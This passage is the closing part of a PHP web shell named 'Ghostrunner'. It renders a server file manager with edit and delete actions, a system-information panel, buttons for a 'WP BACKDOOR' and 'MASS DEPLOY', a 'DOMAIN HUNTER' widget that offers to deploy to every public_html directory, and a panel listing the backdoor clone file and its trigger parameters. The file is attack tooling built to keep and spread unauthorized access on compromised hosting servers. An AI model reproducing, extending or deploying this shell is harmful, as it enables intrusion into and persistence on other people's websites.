                    <div class="card-meta">💾 <?php echo ghost_format_bytes($file['size']); ?> · 🕐 <?php echo date('Y-m-d', $file['mtime']); ?></div>
                    <div class="card-actions">
                        <a href="?p=<?php echo urlencode($cwd); ?>&edit=<?php echo urlencode($file['name']); ?>" class="card-btn">EDIT</a>
                        <a href="?p=<?php echo urlencode($cwd); ?>&rm=<?php echo urlencode($file['name']); ?>" class="card-btn card-btn-danger" onclick="return confirm('Delete file?')">RM</a>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>
            
            <!-- EMPTY -->
            <?php if (empty($scan['dirs']) && empty($scan['files'])): ?>
            <div class="empty">
                <div style="font-size:3rem;">🌀</div>
                <p>EMPTY DIRECTORY · NOTHING TO SEE</p>
                <p style="font-size:0.6rem; margin-top:6px; color:#4a6080;">Upload files or create a new directory</p>
            </div>
            <?php endif; ?>
            
            <?php endif; ?>
        </div>
        
        <!-- ============================================================
        RIGHT COLUMN · SIDEBAR
        ============================================================ -->
        <div>
            <!-- System Info -->
            <div class="widget">
                <div class="widget-title">💻 SYSTEM</div>
                <div class="info-row"><strong>PATH</strong><?php echo htmlspecialchars($cwd); ?></div>
                <?php if ($domain): ?>
                <div class="info-row"><strong>DOMAIN</strong><a href="<?php echo htmlspecialchars($domain); ?>" target="_blank" style="color:#00ffff;"> <?php echo htmlspecialchars($domain); ?></a></div>
                <?php endif; ?>
                <div class="info-row"><strong>ITEMS</strong><?php echo $dir_count; ?> dirs · <?php echo $file_count; ?> files</div>
                <div class="info-row"><strong>FREE</strong><?php echo ghost_format_bytes(disk_free_space($cwd)); ?></div>
                <div class="info-row"><strong>PHP</strong><?php echo PHP_VERSION; ?></div>
                <div class="info-row"><strong>SERVER</strong><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A'; ?></div>
                <div class="info-row"><strong>SHELL</strong>Ghostrunner v<?php echo SHELL_VER; ?></div>
            </div>
            
            <!-- Quick Actions -->
            <div class="widget">
                <div class="widget-title">⚡ ACTIONS</div>
                <div style="display: flex; flex-direction: column; gap: 4px;">
                    <a href="?p=<?php echo urlencode(dirname(__FILE__)); ?>" class="btn" style="justify-content:center;">📍 SCRIPT</a>
                    <a href="?p=/var/www/html" class="btn" style="justify-content:center;">🌐 WEBROOT</a>
                    <a href="?p=<?php echo urlencode($cwd); ?>&wp=1" class="btn btn-danger" style="justify-content:center;">🎭 WP BACKDOOR</a>
                    <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" class="btn btn-primary" style="justify-content:center;">📦 MASS DEPLOY</a>
                </div>
            </div>
            
            <!-- Domains Context -->
            <?php if ($has_domains): ?>
            <div class="widget">
                <div class="widget-title">🌐 DOMAIN HUNTER</div>
                <p style="font-size:0.6rem; color:#4a6080; margin-bottom:8px;">
                    Domains folder detected. Deploy to all public_html directories.
                </p>
                <a href="?p=<?php echo urlencode($cwd); ?>&deploy=1" class="btn btn-primary" style="width:100%; justify-content:center; text-align:center;">
                    🎯 DEPLOY ALL DOMAINS
                </a>
            </div>
            <?php endif; ?>
            
            <!-- Backdoor Info -->
            <div class="widget">
                <div class="widget-title">🔧 BACKDOOR</div>
                <div class="info-row"><strong>FILE</strong><span style="color:#00ffff;"><?php echo CLONE_NAME; ?></span></div>
                <div class="info-row"><strong>DEPLOY</strong><span style="color:#ff00ff;">?deploy=1</span></div>
                <div class="info-row"><strong>WP</strong><span style="color:#ff00ff;">?wp=1</span></div>
                <div class="info-row"><strong>KEYS</strong>Ctrl+S · Esc</div>
            </div>
        </div>
    </div>
    
    <!-- ============================================================
    FOOTER
    ============================================================ -->
    <div class="footer">
        <span>🌀 <?php echo SHELL_ID; ?> · v<?php echo SHELL_VER; ?></span>
        <span><?php echo $total_items; ?> items</span>
        <span class="cyber">"Neon & Steel"</span>
    </div>
</div>

<!-- ================================================================
SCRIPT
================================================================ -->
<script>
    (function() {
        // Auto-dismiss flash messages
        var flashes = document.querySelectorAll('.flash');
        flashes.forEach(function(f) {
            setTimeout(function() {
                f.style.transition = 'opacity 0.5s';
                f.style.opacity = '0';
                setTimeout(function() {
                    if (f.parentNode) f.remove();
                }, 500);
            }, 5000);
        });
        
        // Copy clone URLs on click
        var cloneUrls = document.querySelectorAll('.clone-url');
        cloneUrls.forEach(function(el) {
            el.addEventListener('click', function(e) {
                e.preventDefault();
                var url = this.href;
                navigator.clipboard.writeText(url).then(function() {
                    var original = el.innerText;
                    el.innerText = '✓ COPIED';
                    setTimeout(function() {
                        el.innerText = original;
                    }, 1500);
                });
            });
        });
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Ctrl+S: Save
            if (e.ctrlKey && e.key === 's' && document.querySelector('textarea')) {
                e.preventDefault();
                var saveBtn = document.querySelector('.editor-foot .btn-primary');
                if (saveBtn) saveBtn.click();
            }
            // Escape: Go back
            if (e.key === 'Escape') {
                var backBtn = document.querySelector('.editor-head .btn');
                if (backBtn && backBtn.innerText.includes('BACK')) {
                    window.location.href = backBtn.href;
                }
            }
        });
        
        // Confirm deletions
        var deleteBtns = document.querySelectorAll('.card-btn-danger');
        deleteBtns.forEach(function(btn) {
            btn.addEventListener('click', function(e) {
                if (!confirm('⚠️ PERMANENT DELETE: This action cannot be undone!')) {
                    e.preventDefault();
                }
            });
        });
    })();
</script>
</body>
</html>
